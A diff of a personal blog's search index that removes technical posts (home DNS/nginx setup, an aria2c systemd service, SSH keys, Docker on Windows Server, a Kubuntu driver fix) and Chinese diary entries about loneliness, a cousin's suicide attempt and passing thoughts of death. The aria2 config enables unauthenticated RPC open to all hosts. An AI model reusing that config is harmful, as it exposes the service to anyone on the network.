-]]></content>
-      <categories>
-        <category>DevOps</category>
-      </categories>
-      <tags>
-        <tag>内网穿透</tag>
-        <tag>frp</tag>
-        <tag>reverse proxy</tag>
-        <tag>oracle</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>[编程碎碎念] 为啥要重复造轮子</title>
     <url>/articles/coding/bian-cheng-sui-sui-nian-wei-sha-yao-zao-lun-zi/</url>
     <content><![CDATA[前言作为一个完全没有参加各类编程补习班，当然也不是完全没有，至少我入门编程的时候上了一段时间的Pascal的课，不过现在已经忘光了。笑。
@@ -4780,539 +5036,6 @@ func IsUrl(url string) bool &#123;
       </categories>
       <tags>
         <tag>碎碎念</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>My Internal Network Setup and Configuration</title>
-    <url>/articles/devops/setup-my-internal-network/</url>
-    <content><![CDATA[PrologueFor example, I have following services running in my local network.
-
-Git Server: Located at 192.168.1.100:80
-Jellyfin Server: Located at 192.168.1.101:8000
-NAS (Network Attached Storage): Located at 192.168.1.101:8010
-
-Is there any good way to access them without typing ip address?
-Yes. In this blog post, I&#39;ll walk you through how I set up my internal network. 
-
-
-Setting Up a Private DNS ServerThe first step in our journey is to set up a private DNS server within our local network. For this, I chose AdGuardHome, which I deployed at 192.168.1.102.
-With AdGuardHome, I was able to set up custom DNS resolutions. For instance:
-
-server1.cuora resolves to 192.168.1.101
-server2.cuora resolves to 192.168.1.100
-
-However, if a service operates on a different port, we need to employ a reverse proxy, like nginx, to handle the traffic.
-Setting Up a Reverse ProxyI set up a proxy server at 192.168.1.103. This means that any requests to *.internal.cuora are directed to the proxy server at 192.168.1.103.
-
-Nginx ConfigurationHere&#39;s a brief overview of my nginx setup:
-
-For jellyfin.internal.cuora, traffic is directed to 192.168.1.101:8000
-For git.internal.cuora, traffic is directed to 192.168.1.100:80
-For nas.internal.cuora, traffic is directed to 192.168.1.101:8010
-
-With this configuration, I can easily access all my internal services using domain names, making the entire process seamless and user-friendly.
-Example Config
-server &#123;
-    listen 80;
-    
-    server_name jellyfin.internal.cuora;
-
-    location / &#123;
-        proxy_pass http://192.168.0.180:8030/;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-Host $host;
-        proxy_set_header X-Forwarded-Port $server_port;
-    &#125;
-&#125;
-
-don&#39;t forget to add a default nginx config
-server &#123;    
-   listen 80 default; 
-   server_name _; 
- 
-   root /usr/share/nginx/html;
- 
-   index index.html index.htm;
- 
-   location / &#123; 
-     try_files $uri $uri/ =404;
-   &#125; 
-&#125;
-
-Settup RouterThis part is quite easy. In DHCP setting, just set default DNS server to our own private dns server 192.168.1.102.
-
-Network Structure
-Done!
-]]></content>
-      <categories>
-        <category>DevOps</category>
-      </categories>
-      <tags>
-        <tag>network</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>打开user lingering来运行服务 + 在linux上建立aria2c服务</title>
-    <url>/articles/devops/enable-linux-user-lingering-for-service/</url>
-    <content><![CDATA[概括最近在搞自己的小主机，在配置自己的aria2c服务的时候，发现aria2的服务时不时就会断掉,并报错Emergency shutdown sequence commencing。
-本文介绍了如何修复这个问题，以及我的aria2服务配置
-
-
-问题因为想要aria2c以非root用户运行，我用 systemctl --user start aria2.service，这个时候服务正常启动，也不会结束。
-但是，一旦我退出这个ssh session，过几秒之后aria2c就会自动停止。
-重复几次试验后，确认了退出ssh session后，aria2c服务就会停止。
-下面是报错的日志
-2022-04-24 12:55:45.578362 [NOTICE] [HttpListenCommand.cc:108] IPv4 RPC: listening on TCP port 6800
-2022-04-24 12:55:45.578468 [NOTICE] [HttpListenCommand.cc:108] IPv6 RPC: listening on TCP port 6800
-2022-04-24 12:55:57.533186 [NOTICE] [DownloadEngine.cc:265] Emergency shutdown sequence commencing...
-
-原因&amp;解决方法在进行了一定时间的互联网冲浪后，我在stackexchange上找到了解决方法: 链接.
-原因是运行这个service的用户没有user lingering。
-根据 loginctl 的 man page所说
-
-Enable&#x2F;disable user lingering for one or more users. If enabled for a specific user, a user manager is spawned for the user at boot and kept around after logouts. This allows users who are not logged in to run long-running services. 
-
-简单来说，如果一个用户没有开启user lingering，他开启的service在这个用户登出之后就会自行结束。
-所以，解决方法就是为运行这个service的用户开启user lingering
-我们可以用这个命令来打开
-sudo loginctl enable-linger aynakeya # enable user linger for aynakeya
-
-开启完毕后我们再次启动service，然后登出ssh session。发现这个时候aria2已经不会自动退出了。
-Aria2 As Service顺便贴一下aria2作为系统服务的配置。
-安装好aria2后，把这个文件aria2.service 放到 /etc/systemd/user/目录下即可。
-启动aria2的方式为:  systemctl --user start aria2.service关闭为: systemctl --user stop aria2.service
-[Unit]
-Description&#x3D;Aria2c As Service
-
-[Service]
-Type&#x3D;forking
-ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;aria2c -D --conf-path&#x3D;&#x2F;home&#x2F;aynakeya&#x2F;repo&#x2F;aria2&#x2F;aria2-daemon.conf
-WorkingDirectory&#x3D;&#x2F;home&#x2F;aynakeya&#x2F;repo&#x2F;aria2
-
-[Install]
-WantedBy&#x3D;default.target
-
-aria2-daemon.conf的内容如下
-# server config
-continue&#x3D;true
-# run as service
-daemon&#x3D;true
-#设置加密的密钥
-#rpc-secret&#x3D;aaabbbccc
-#允许rpc
-enable-rpc&#x3D;true
-#允许所有来源, web界面跨域权限需要
-rpc-allow-origin-all&#x3D;true
-#允许外部访问，false的话只监听本地端口
-rpc-listen-all&#x3D;true
-#RPC端口, 仅当默认端口被占用时修改
-#rpc-listen-port&#x3D;6800
-
-
-# logging config
-log&#x3D;&#x2F;home&#x2F;aynakeya&#x2F;repo&#x2F;aria2&#x2F;log&#x2F;aria2.log
-log-level&#x3D;notice
-
-# download config
-
-#最大同时下载数(任务数), 路由建议值: 3
-max-concurrent-downloads&#x3D;5
-#断点续传
-continue&#x3D;true
-#同服务器连接数
-max-connection-per-server&#x3D;5
-#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要
-min-split-size&#x3D;10M
-#单文件最大线程数, 路由建议值: 5
-split&#x3D;10
-#下载速度限制
-max-overall-download-limit&#x3D;0
-#单文件速度限制
-max-download-limit&#x3D;0
-#上传速度限制
-max-overall-upload-limit&#x3D;0
-#单文件速度限制
-max-upload-limit&#x3D;0
-#断开速度过慢的连接
-#lowest-speed-limit&#x3D;0
-#验证用，需要1.16.1之后的release版本
-#referer&#x3D;*
-#文件保存路径, 默认为当前启动位置
-dir&#x3D;&#x2F;home&#x2F;aynakeya&#x2F;Downloads
-#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本
-#disk-cache&#x3D;0]]></content>
-      <categories>
-        <category>DevOps</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>aria2</tag>
-        <tag>lingering</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ubuntu22.04 SSH的RSA私钥不能用了</title>
-    <url>/articles/devops/ubuntu-ssh-rsa-key-is-not-working-since-upgrade-to-22-04/</url>
-    <content><![CDATA[Ubuntu从20.04升级到22.02之后ssh的私钥不能用了，出现permission denied.
-查了一下是因为Ubuntu22.04默认不再支持SHA1了。所以就不能用了。
-解决方法也很简单，生成一个新的密钥对即可
-ssh-keygen -t ed25519 -C &quot;youname@computer-name&quot;
-ssh-copy-id youname@xxx.xxx.xxx.xxx
-
-参考答案
-]]></content>
-      <categories>
-        <category>DevOps</category>
-      </categories>
-      <tags>
-        <tag>ubuntu</tag>
-        <tag>ssh</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>在windows server 2016上安装Docker + Docker Compose</title>
-    <url>/articles/devops/windows-server-2016-setup-docker/</url>
-    <content><![CDATA[如何在windows server 2016上安装Docker + Docker Compose
-Quick Start简单来说，按照Microsoft官网上的来做就行了。但是，不用加-Repository PSGallery -Force, 加了就报错
-
-
-安装Docker
-Install-Module -Name DockerMsftProvider
-
-[System.Net.ServicePointManager]::SecurityProtocol &#x3D; [System.Net.SecurityProtocolType]::Tls12;
-
-Install-Package -Name docker -ProviderName DockerMsftProvider
-
-Restart-Computer -Force
-
-
-
-安装Docker-Compose
-[Net.ServicePointManager]::SecurityProtocol &#x3D; [Net.SecurityProtocolType]::Tls12
-
- Invoke-WebRequest &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;v2.10.2&#x2F;docker-compose-Windows-x86_64.exe&quot; -UseBasicParsing -OutFile $Env:ProgramFiles\Docker\docker-compose.exe
-
-坑出现各种奇怪的问题首先更新windows server
-在Install-Module -Name DockerMsftProvider出现问题别加-Repository PSGallery -Force
-Reference
-https://docs.microsoft.com/zh-cn/virtualization/windowscontainers/quick-start/set-up-environment?tabs=Windows-Server
-https://docs.docker.com/compose/install/compose-plugin/#install-compose-on-windows-server
-
-]]></content>
-      <categories>
-        <category>DevOps</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>Windows Server</tag>
-        <tag>installation</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[日记] 2023 10 01</title>
-    <url>/articles/diary/diary20231001/</url>
-    <content><![CDATA[撐不下了去
-]]></content>
-      <categories>
-        <category>Diary</category>
-      </categories>
-      <tags>
-        <tag>日记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[日记] 2023 12 09</title>
-    <url>/articles/diary/diary20231209/</url>
-    <content><![CDATA[祝我生日快乐
-]]></content>
-      <categories>
-        <category>Diary</category>
-      </categories>
-      <tags>
-        <tag>日记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Resolving System Crash Issue After Installing Kubuntu on ThinkBook 16+</title>
-    <url>/articles/devops/resolving-system-crash-on-kubuntu-with-thinkbook-16/</url>
-    <content><![CDATA[Introby ChatGPT
-During my recent work, I attempted to install the Kubuntu operating system on a ThinkBook 16+. However, I encountered an intriguing issue. After successful installation, I began to experience unpredictable system crashes followed by a reboot. In this blog, I will share my troubleshooting and resolution process, hoping to help readers who encounter similar issues.
-
-
-Observation and DiagnosisBefore beginning my investigation, I first observed the manifestation of these crashes. I noticed that the system would crash only after establishing a network connection, which led me to suspect an issue with the network driver. Upon checking the hardware specifications of the device, I found that the network adapter is an mt7921e.
-To further probe the potential issues within the system, I ran the command sudo journalctl | grep mt2971e in the terminal, seeking relevant error messages from the system logs. From the returned logs, I noticed the following entries:
-May 18 16:37:52 kernel: mt7921e 0000:03:00.0: Timeout for driver own
-May 18 16:37:52 kernel: mt7921e 0000:03:00.0: driver own failed
-
-Searching for a SolutionArmed with this information, I began looking for possible solutions online. On GitHub, I came across an issue similar to my problem: https://github.com/openwrt/mt76/issues/681. From this issue, I learned that the problem could potentially be related to the version of the Linux kernel.
-Therefore, I attempted to update to the 6.1 generic version of the kernel, but the issue persisted—the system continued to crash.
-The Final SolutionDespite the fact that updating to the latest generic kernel did not solve the issue, I did not give up. After conducting further research, I decided to try installing the 6.1 version of the ubuntu OEM kernel.
-Following the instructions provided in the official Ubuntu documentation at https://wiki.ubuntu.com/Kernel/OEMKernel, I installed the OEM kernel. 
-apt install linux-oem-22.04c
-
-The result was success—the system no longer experienced crashes or reboots!
-ConclusionThrough the process of resolving this issue, I gained a deeper understanding of the Linux kernel and network drivers. I also learned how to pinpoint and resolve issues through system logs and online resources. By sharing this experience, I hope to assist others experiencing similar issues on their Linux systems.
-]]></content>
-      <categories>
-        <category>DevOps</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>kernel</tag>
-        <tag>kubuntu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[日记] 2023 12 10</title>
-    <url>/articles/diary/diary20231210/</url>
-    <content><![CDATA[昨天有个人，一个应该忘掉我的人，给我祝了生日快乐。我破防了。
-怎么说呢，感觉像个孤独患者在那里自我拉扯。
-我也不知道为啥，我从小就能很清楚的感受他人的情绪，不论是从表情上还是从言语上，他人的情绪对我仿佛就是没有那个掩饰一般。喜，怒，哀，乐。任何情绪，我都能如切身的体会到一般感受到他人的情绪。我甚至能一定的从情绪中感受到一部分他人的真实想法。
-他人即地狱，我处理不来这种事情。这些事情对于我来说一种巨大的压力，我一度无法处理这种麻烦而陷入自闭。而现在这种自闭的时间越來越长也越來难以调节了。
-总之，因为这个特质，我有时候会过于注重自己的言行对于他人的感受，我一直小心翼翼的活着深怕自己对他人造成什么影响。我一直想修正这个问题，我尝试过很多办法，有些没用，有些开始有用，但随着时间的推移效果越来越弱。我只能强硬的把自己的内心隐藏起来，把自己感性的一面深深的藏起来，用完全理性的态度来生活。
-为了压制住内心的情感，防止自己的言行对他人造成麻烦。我试图给自己的带上一个个面具，面对不同的人，都用着不同的面具。祈求于这种方式能够至少在表面上维护与建立起我正常的社交关系。
-这种方式很不讲道理，但是很有效。谁能想到脸部红心不跳的说出的话语实际上是谎言呢。我知道欺骗别人是不好的，但是让别人不要让别人麻烦或许对于我而言更为重要，所以对此，我与愿意去欺骗他人。
-也许是面具带的多了，我开始丧失了表达自己内心真实情感想法的能力，我害怕自己真实的情感会造成他人的不适，会让别人对我另有看法。我也害怕这幅面具消逝之后，其他人是否能够接受真实的自己。
-我知道这些都是些老生畅谈的问题了，也许对于整个社会来说，这个问题就是常见的，小小的事情。但对于我来说就是隔在我与现实社会的一道墙，一个屏幕。我害怕去推开他，我也不愿去推开他。
-可惜这个方法也快要失效了，虽然我依旧能够扮演出我想要的那个角色，内心里却有一种无法控制的力量想要把这个面具撕毁，撤碎。我害怕，非常害怕表达出真实的情感，害怕隐藏在一个个面具后的我被揭露出来。所以我开始自闭，试图远离一切人际交流关系，试图把自己和整个人际关系分割开来。
-但是，为什么呢，这究竟是为什么呢。明明已经习惯了这么多年来一个人孤独的活着，不把自己的内心展现给他人。我明明刻意的隐藏自己的生日，刻意的不和任何人提起自己的生日，甚至试图让自己忘掉我还有生日这件事情。
-明明我不想有人给我发，但是我就是控制不住的破防了。明明我知道对于她来说，就是突然记起来的随手一发，我还是像一个在阴湿角落祈求光明的可怜虫，故作无意的问她为什么突然发这个。
-真是好笑
-]]></content>
-      <categories>
-        <category>Diary</category>
-      </categories>
-      <tags>
-        <tag>日记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[日记] 2024 01 03 night</title>
-    <url>/articles/diary/diary20240103-2/</url>
-    <content><![CDATA[怎么说呢，我从小到大就是一个没有什么主见的人。也不是没有什么主见吧，可能更准确的说法是我好像一直是为他人而活着的。就说小学的时候，我当时啥也不知道也不记得什么事情了，只要是我认为我做的事会让父母开心，那我会去做。不管是上什么乱七八糟的兴趣班，还是努力拿个啥子的学习小能手。
-而在初中的那段时间，我生活的动力就完全为了我喜欢的女生。
-我是在一个当地的重点初中上的学，父母给我选择这所学校的主要原因还是因为我的身体。我一直患有过敏性鼻炎，就是对尘螨，花粉一类的东西过敏。而且一直治不好。所以家里给我选了一个周围环境较好的初中读书，希望鼻炎不要那么严重。
-我在初中的成绩一直不错，虽然拿不到班级前五，但是中上游还是有的。主要原因还是偏科偏的有点厉害，经常是数学科学能拿95,96，但要说起文科，那就是一塌糊涂了。英语政治这些还行，靠记忆还能勉强混个85左右。语文就是纯纯的在70分上下徘徊了，阅读理解实在是做不明白。（都是100分制）
-我的同桌在数学这方面就有点不是很好了。或许一开始是我看不下去她弄不明白某道题目，我就开始教她怎么做题。一来二去的我们两个也就熟了起来。我给他讲讲题，她也会借她的语文作业给我参考。
-后来不知道从哪天起，我发现我有点离不开她了，每天上学的动力就是去见她。学习的目标也从让家里人开心变成了如何学的明白点，然后狠狠的辅导她的功课。 &#x2F;&#x2F; 怎么说呢，感觉有点扭曲了。
-总之不管怎么说，她的数学也的确慢慢的好起来了，甚至在几场小考中比我考的都高。
-这样的关系即使我们两个不是同桌之后依然存在，直到初三上学期。
-本来我的目标就是单纯的去中考考个好高中，或者走提前招生想办法进个重点高中，如果能把她也给拐到同一所高中最好。嘛，即使不是同一所高中，至少是在同一所城市嘛。
-但因为我的鼻炎实在是好不了而且有愈发严重的趋势，我父母打算把我直接丢到国外去读书，毕竟相比较当时的国内空气质量来说，国外的空气质量确实要好不少。
-那我当时是坚决不同意啊，我初三还没上完呢，我还想和她多见几面，怎么可以现在就润。总之几番拉扯之下，也是我当时不够坚定的原因，最终我爸妈决定先让我在国内找一个国际学校读一读，然后大学再去国外上。
-这个时候先插入一个设定，我初中的时候有课间餐这东西存在，就是每天的第n节课后（n是几忘了），负责送货的人会把蛋糕啥的丢教室门口，然后大伙一下课一拥而上去恰蛋糕。
-在这两年，她的那份都是我出去拿然后给她带进来了。ok 设定结束
-我和她说了这事，说我爸妈感觉想送我到国际学校读书。她当时也没什么特别反应，就回了句 &quot;国际学校啊，那也挺好的&quot;，然后也没有后续了。
-大约是初三上中旬的某一天，我一如往常的帮她拿了蛋糕。她没有像往常一样接过，而是有点认真的给我说，“X, 以后不用帮我拿了” (X &#x3D; 我的全名)。
-我当时有点蒙，反正下意识的就点了点头说行吧。
-从那以后，我俩的交集就慢慢的变少了。
-之后的日子我反正就是浑浑噩噩的度过，也没啥可说的了。总之结果就是我顺利考进了那所国际学校，她进了一所本地的普高。
-我已经分不太清这是梦还是真实发生的事情，我记得我有一天在qq上问她你喜欢过我么。
-“真的要说么？” 她说，“应该是喜欢过的吧”
-反正我当时不知道脑子抽了还是怎么回事，就回了句“那就这样吧”，就结束话题了。
-]]></content>
-      <categories>
-        <category>Diary</category>
-      </categories>
-      <tags>
-        <tag>日记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[日记] 2024 01 03</title>
-    <url>/articles/diary/diary20240103/</url>
-    <content><![CDATA[怎么说呢，现在这个世界上真的好事没多少，坏事一件比一件多。那作为一个普通人，光是看到这些坏事就已经很无奈，很气愤了。要是一不小心代入了，直接能给我气到昏迷。
-但是除了愤慨好像也啥事都做不了，就好似那个生气的河豚，给自己涨得圆滚滚的。却不知在人看是如此的可笑。
-这时候就有人要说了，你觉得不好你就去改变它，你觉得不行你就去建设他。你不发动自己的主观能动性在这边说说有啥用处呢。说到底还是自己不够努力，改变不了，嘻嘻。
-还真是，我就是废物。我没办法改变世界，甚至没办法改变他人，我唯一能够改变的就是自己。我唯一能做的就是让我至少在未来碰到这类事情的时候，我不会做出是他人受到伤害的决定。
-除此之外，我们什么都改变不了。
-]]></content>
-      <categories>
-        <category>Diary</category>
-      </categories>
-      <tags>
-        <tag>日记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[日记] 2024 01 04</title>
-    <url>/articles/diary/diary20240104/</url>
-    <content><![CDATA[draft
-来讲讲我在国内读国际高中的事情。可能有些吧友对国际高中有点误解，认为里面都是群天天嗯开party的富家子弟。怎么说呢，这得看学校，也得看人。
-首先是我读的那所国际高中，还是以升学率为目标的，也就是最后申请季的学生申请情况。所以老师也是相对严格一点，当然还是比不上国内普通高中的，毕竟能来上学的都是有点米的学生，自然也会有点闹腾的心。
-&#x2F;&#x2F; 当然也有些打着“国际高中”，实际则为贵族学校的的高中，那个也许比较接近大伙的想象，但是我没去过我也不知道。
-当然也得分人，大体可以分为两批人，一批想要申请顶尖大学的卷王，当然也有一批只有有学读就可以的。
-再来说说课程，可能相比国内高中的深，我读的国际学校可能相对而言不是很深，但是比较宽。因为是在国内读的，我们必须在同时通过所有学考的情况下（关系到拿到高中毕业证），然后读一些大学课程 &#x2F;&#x2F; 我读的是AP
-比如微积分啊，统计，大学化学，Java, 量子力学之类的东西。哦还有天杀的SAT和TOEFL
-ok设定介绍完成
-因为是国际学校，我们能掌控的自由相对而言还是比较多的。就比如，能带电脑上学。 &#x2F;&#x2F; 因为电脑要用于上课
-鼠鼠因为失去了生活的目标，寻思着找个事情逃避现实，于是鼠鼠就开始自学编程，然后整天像个nerd一样对着计算机屏幕疯狂输出。
-总之就是题目不会做了，生活中遇到烦心事了，ok，直接两而不闻窗外事，然后隔那恩敲代码，管他什么作业ddl，先等我写完代码再说。
-当然副作用也是有的，鼠鼠的编程技能从0开始一路起飞，写了不少项目，包括博客啊啥的。甚至有一个小软件一度到达过用户量200+的成绩。
-所以，理所应当的，鼠鼠把编程当初自己唯一的依靠，毕竟只有在这里，鼠鼠才能找到属于自己的存在感。
-当然在高二开始申请大学的时候，我也是一门心思的往计算机比较好的大学申请。可惜由于当时情况特殊，美国的大学基本都把我给拒绝了（头铁直接嗯申计算机）。
-最后还是加拿大的一所学校给了我offer。&#x2F;&#x2F; 别开我盒
-然后鼠鼠就去了。
-ok扯远了，下面正式进入留学生活。
-由于毕业那年正好碰上疫情，给封在家里出不去了，鼠鼠又不想浪费一年时间搞那啥gap year，纯纯的浪费时间。
-于是鼠鼠就开始日夜颠倒的上网课了，简单来说就是白天睡觉，晚上上课。
-ok 第二年，鼠鼠就独自踏上了前往加麻大的留学生活。
-怎么说呢，只能说空气相比国内确实要好很多，鼠鼠的鼻炎到这儿后就没有复发过了。
-大二那年，鼠鼠和同学一起租了一个大house。当然不值鼠鼠一个人。房东把一整个别墅分成了好几个房间，分别租给不同的人，有点像群租房那种。算一算，那个大house里，地下一层住了五个人，第一层住了4个人，第二层住了4个，加起来十多个人。不过至少每个人都有单独的房间就是了。
-当然租客也不止国人，也有本地人，当然也有印度人。
-说说第一印象吧，当时那个印度租客怎么说呢，就是一股子咖喱味，又有点臭臭的，不是太好评价。然后他做菜做的确实是一拖糊糊，比如他有个常备的粉碎机，做菜时先把番茄啊，鸡蛋啊，黄油啊啥的，不管三七二十一先放进粉碎机里打碎，然后倒到锅里煮，煮完就嗯造。
-然后本地人的印象就挺正常的了，有逆天的，也有非常正常好相处的人。
-比如住在二楼的一个白人，姑且称呼为A。比较逆天的是他用锅做完菜之后从来都不洗。
-我记得有一次A拿平底锅隔拿嗯煎鸡腿，重点是那个鸡腿还没有化冻，煎完之后他也不管熟没熟，直接就开始啃。啃完之后把锅一扔就不管它了。
-到了第二天，他又下来做饭了，这次他拿着没洗过的锅，直接开始煎鸡蛋，我当时大为震撼。
-说实在的，来加麻大前就知道这地方抽w33d的人挺多。但我确实没想到会这么多，有时候你走在路上，要是突然闻到一股令人恶心的臭味，那个就是有人刚刚飞过了。
-再来说说治安，治安这东西，得看地区，最乱的地方就是市中心。白天倒是挺正常的，除了可以随时见到流浪汉之外也没啥好说的。
-但是到了晚上，那就是整一个群魔乱舞。鼠鼠有一次和同学去市中心吃自助，吃完有点晚了。出来的第一感觉就是，我去好浓的w33d味，直接给我恶心坏了。
-在走向公交车站的路上，随地可以看见周围吸嗨了的人，正在交易的流浪汉，还有拿着拐杖当长枪乱挥的，给我和同学看的一愣一愣的。
-最离谱的时候，在路上突然窜出一个流浪汉，一边直接上手来扯我同学的外套，一边用及其诡异的姿势问我同学，“你这夹克衫哪里来的？”。
-我和同学两大男人直接给吓傻了，我直接回了句“我们不说英文”，然后拉着我同学就一路跑到公交车站。直到上车才缓过气来。
-以后我们就决定晚上再也不去downtown了，真的太危险了。
-至于我们住的房子，还有学校，这个就属于“郊区了”，平常人都看不见一个，更别说流浪汉了。还是相对来说比较安全的，不过有了这次的经历，我俩晚上就再也没出去过。
-]]></content>
-      <categories>
-        <category>Diary</category>
-      </categories>
-      <tags>
-        <tag>日记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>日记 20240206</title>
-    <url>/articles/diary/diary20240204/</url>
-    <content><![CDATA[五分真五分假，看个乐子
-我小学开始，我就时不时的会被“鬼压床”，我不太好说这到底是不是鬼压床，因为他和平常大家描述的鬼压床不太一样。
-而且每次出现的都是同一个效果。而且分阶段
-这个“鬼压床”每次都发现在睡觉前。
-第一阶段
-在快要睡着的时候，身子会突然从后背开始发麻，然后逐渐蔓延到全身，接着四肢就动不了，即使意识非常清醒。后来，当这个征兆出现的时候，我就很明确清楚的意识到这事又来了，但是我没办法反抗，只能被拖入第二阶段。
-第二阶段
-紧接着，我耳朵会出现那种呓语。我不太好描述这个呓语，真要说可能是克苏卢那种不可名状，不可描述的感觉。感觉是一种带着有点疯狂的嘻笑，声音会逐渐增大直到充斥我整个脑海。同时会有一种无法用语言描述的恐惧感出现在心里。
-第三阶段
-等到那股笑声到达巅峰的时候，我感觉身下会出现一个黑洞一样的漩涡，会渐渐开始有一股力量撕扯着我把我往下拉。往下，往下一直往下。
-每次出现这种情况的时候，我都会在疯狂的试图呼吸，说话，和睁开眼睛。然后，我也每次都能在第二阶段，或者第三阶段挣扎出来。
-在我小学的时候，这种现象一般是一个月会出现1到二次。到了初中的时候，频率逐渐加多。到高一快结束的时候到达巅峰。那段时间，甚至是一周出现2,3次。有时甚至能连着出现两三天。
-我也给我家里说过，带我看了医生也看不出个所以然，就说可能是身体比较虚吧。
-总之，这样的现象，一直持续到那件事发生后，从那以后，我就再也没有遇到过相同的鬼压床了
-大概是高一的下半学期。那天，因为我和家里大吵了一架，具体原因大概是考试没考好。我本就挺难受的，家里还要说我，我就挺难受的。总之一直吵到睡觉前，我父母还在那边唠叨。
-那天好巧不巧，相同的鬼压床有出现了。与之前不同的是，这次我没有任何的反抗，想着要是这样意识消失了也不错，至少不需要在被学习什么烦恼了。
-于是，我没有任何反抗的，被那个漩涡吸入。接着，我就失去意识了。
-第二天，我正常的醒来。感觉似乎似乎一切都没有任何变化。似乎缺了什么，但我又说不出来。
-当天在学校里，我一改往日行为，变得有点沉默寡言了。我同学都有点奇怪，为啥我突然不活跃了。我也不知道，只说被训了一顿，心情不太好。不过同学也都了解我，一般这种事我第二天醒来就忘记了。他们就当我遇到了别的什么事情，也没有多问&#x2F;
-直到放学回家，我打开平板看点视频，动漫啥的。知道我打开一个视频，就是类似那种消防员冲进火场救人，狗狗救主人的那种类似的感人小视频的时候。
-我突然意识到，我并不是心情不太好，而是我失去感情了。
-这是一种很奇怪的感觉，我知道感情是什么，我甚至知道某些时刻我应该有什么感情，但是我就是感受不到任何感情。
-任何喜怒哀乐，对于我来说仿佛就是一个概念，我知道它，我了解它。但是我和他就仿佛隔着一层玻璃，我碰不到她们。
-我一部特别喜欢的动漫plastic memory（可塑性记忆），我刷了好几遍，里面很多情节我机会每一次刷都能有点那种泪目的感觉。
-但是，当我再次重复观看这部动漫的时候，当我再次看到那些情节的时候，我很明确的意识到，我这里应该会被感动。但是我就是没有丝毫的情绪，非常奇怪。
-说实话，这个虽然一开始对我有点影响，但是我很快就适应了。因为即使我感受不到情绪，但是我依旧知道某个时候应该有什么情绪，从而表演出来。
-或许是有人从我这边取走了什么，同时也我留下了一点什么东西。我甚至不知道这两件事有没有关联。
-我发现自己有了一点特殊的能力。我也不知道这到底是真的还是单纯是某些心理学现象。
-就是，我会时不时的能感受到“神启”，我不太好描述这是一种什么能力。
-我最早意识到我有这种能力，是在发生这件事之后的第三天，当时我和同学正偷偷用大屏幕看nba篮球直播。看着看着，我突然鬼使神差来了一句，“下一球，xxx会进三分。”我也不知道我为什么说出这句话，完全是我在无意识的情况下说出来的。紧接着，大约半分钟后，xxx果然进了三分。
-我同学当时很惊讶，我也有点惊讶，但是更多的是一种“就是应该这样”的感觉。
-这样的事情，在我失去感情之后就经常出现了。
-这个能力，完全就是属于被动触发，触发条件是啥我完全不知道。但是发动的时候，我会完全不由自主的无意识的说出一句话，或者一段话。
-这一段话，基本会在接下来的半小时内以某种方式实现，或者印证。
-就在去年10月份的时候吧，我和同学在打英雄联盟。当时我和同学走下路。我在和同学一句一句有聊没聊的。
-我印象非常深，我们刚刚和打野三包二把下路越了正在吃镀层，这个时候，对面重担在中路，打野和对面上路在打虫子。理论上没有任何人威胁到我们。
-正吃着的时候，我也不知道我为什么，突然就说了一句“别死”。 我同学正疑惑呢，问我：“什么别死，对面人都不在我怎么死”
-这个时候我不知道为什么，我大脑一片空白，跟卡壳了一样。我在没有意识的情况下，似乎是以非常扭曲的声音喊了一声（据我同学描述）
-“姐姐？”
-我同学当时正疑惑是谁在说话，但因为当时discord里就我两个，他很快就确认了就是我在说话，因为除了我之外也没有其他人了。
-他就问我，为什么突然喊了一声姐姐。我也说不上，我只告诉他我有一个比我大2,3岁的表姐，小时候对我非常好。我童年在外婆家的美好记忆至少有一半都是和她有关
-但我表姐后来因为他父母离婚，爸爸赌博欠债跑路，生活弄得一团乱，我们家也尝试帮助过她们，但是和投进水里的石子一样。她们最后也有点不太好意思一直接受，所以最后也慢慢放弃了。
-因为在打游戏么，我当时也没怎么在意，打了个哈哈就继续对线了。
-但是，10分钟后，我妈妈突然给我打电话，告诉我了一个消息，我表姐试图在浴室里割腕自杀，刚刚抢救回来。人还昏迷着。
-我只记得我当时没有任何惊讶，伤心，或者说任何情绪。感觉这一切都是理所当然会发生的，而我就是旁观者一样的感觉。
-]]></content>
-      <categories>
-        <category>Diary</category>
-      </categories>
-      <tags>
-        <tag>日记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>diary20240209</title>
-    <url>/articles/diary/diary20240209/</url>
-    <content><![CDATA[翻来覆去睡不着觉，也没有心情敲代码，我就侧着身子躺在床上。
-我划着朋友圈的年夜饭图片，划着社交媒体上各种人发着各种各样的庆祝新年的照片。
-我看着某个游戏群的群友在那边相互臊皮，我也看着某个小说书友群的群友在那里相互祝贺新年。
-我不知为何就哭了，我不知道我为什么在哭，眼泪他就自顾自的流了下来。
-这好像是我自初中以来第一次哭。明明前几年也是一个人度过的，今年怎么就这么难熬呢。
-我的心脏一抽一抽的，感觉有人在拉扯它一样，又酸又疼。我也不知道怎么才好，哈哈，也许这个时候猝死是一个不错的选择呢。
-我站起来拉开窗帘，外面的天还是黑的。虽然国内也是黑的，但这个时候或许已经被烟花照亮了吧。
-深呼吸，带起你的面具，藏好你的内心，今天还有课要上。
-Aynakeya
-]]></content>
-      <categories>
-        <category>Diary</category>
-      </categories>
-      <tags>
-        <tag>日记</tag>
-      </tags>
-  </entry>
-  <entry>
